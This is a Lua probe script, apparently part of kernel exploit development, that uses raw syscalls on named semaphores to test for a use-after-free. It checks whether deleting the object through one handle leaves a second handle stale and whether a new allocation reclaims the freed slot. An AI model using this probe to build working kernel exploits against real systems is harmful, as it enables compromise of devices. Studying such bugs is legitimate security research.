-- CRASH_CLASS: MODERATE
-- PROBE 439a: what happens to a second handle when the first one deletes the object?
--
-- 438a proved the object table can be aimed: the id is `generation << 13 | slot`, a freed
-- slot goes to the next allocation across every family, reuse is LIFO, and the generation
-- climbs by one each time. That is the reclaim half of a use-after-free.
--
-- The other half is a lifetime hole. osem is the family with two ways to reach one object:
-- 549 creates it (optionally registering a name), 551 opens the registered name and returns a
-- second handle to the same object. If 550 (delete) frees the object while the second handle
-- is still live, then the next allocation reclaims that slot and a later call through the
-- stale handle would operate on the new object.
--
-- [A] create a named osem h1, open it by name as h2
-- [B] post on h2, poll on h2 (the object is live through both handles)
-- [C] delete h1 - the object should be gone if delete is unconditional
-- [D] the decisive part: poll/post h2 again, then close h2
-- [E] reclaim: create a fresh osem and see whether it takes h1's or h2's slot
-- [F] does the name still resolve after the delete?

print("=== PROBE 439a: OSEM LIFETIME ===")

local GEN_SHIFT = 8192
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, rv = pcall(function()
        return sc(uint64(a1 or 0), uint64(a2 or 0), uint64(a3 or 0), uint64(a4 or 0), uint64(a5 or 0), uint64(a6 or 0))
    end)
    if not ok then return -999 end
    if type(rv) == "table" and rv.h then
        local h, l = to_num(rv.h), to_num(rv.l)
        if h >= 2147483648 then h = h - 4294967296 end
        if l >= 2147483648 then l = l - 4294967296 end
        if h == -1 and l == -1 then return -1 end
        return h * 4294967296 + l
    end
    local n = to_num(rv)
    if n >= 9223372036854775808 then n = n - 18446744073709551616 end
    return n
end
local function slot(h) return h % GEN_SHIFT end
local function gen(h) return math.floor(h / GEN_SHIFT) end
local function tag(h) return string.format("%d(g%d/s%d)", h, gen(h), slot(h)) end

local page = call(477, 0, 0x1000, 7, 0x1002, 0xFFFFFFFF, 0)
if page <= 0 then print("no page") return end
local i = 0
while i < 0x400 do memory.write_qword(page + i, uint64(0)); i = i + 8 end

local name = memory.alloc(0x40)
local NAME = "omp439a"
local j = 1
while j <= #NAME do memory.write_byte(name + j - 1, NAME:byte(j)); j = j + 1 end
memory.write_byte(name + #NAME, 0)
local out = page + 0x100

local h1 = call(549, name, 0x100, 0, 4, 0, 0)
local h2 = call(551, name, 0, 0, 0, 0, 0)
print(string.format("[A] h1=%s h2=%s", tag(h1), tag(h2)))
if h1 < 0 or h2 < 0 then print("=== 439a DONE (no handle) ===") return end

print(string.format("[B] post(h2,1)=%d poll(h2,1)=%d poll(h2,1)=%d",
    call(555, h2, 1, 0, 0, 0, 0), call(554, h2, 1, 0, 0, 0, 0), call(554, h2, 1, 0, 0, 0, 0)))

-- make h2 have a count so a later poll is observable
call(555, h2, 2, 0, 0, 0, 0)

local del = call(550, h1, 0, 0, 0, 0, 0)
print(string.format("[C] delete(h1)=%d", del))

local post2 = call(555, h2, 1, 0, 0, 0, 0)
local poll2 = call(554, h2, 1, 0, 0, 0, 0)
print(string.format("[D] post(h2,1)=%d poll(h2,1)=%d close(h2)=%d",
    post2, poll2, call(552, h2, 0, 0, 0, 0, 0)))

local reclaimEvf = call(538, page, 0, 0, 0, 0, 0)
print(string.format("[E] fresh evf=%s (h1 slot %d, h2 slot %d)",
    tag(reclaimEvf), slot(h1), slot(h2)))

local reopen = call(551, name, 0, 0, 0, 0, 0)
print(string.format("[F] reopen by name=%d", reopen))

print("=== 439a DONE ===")
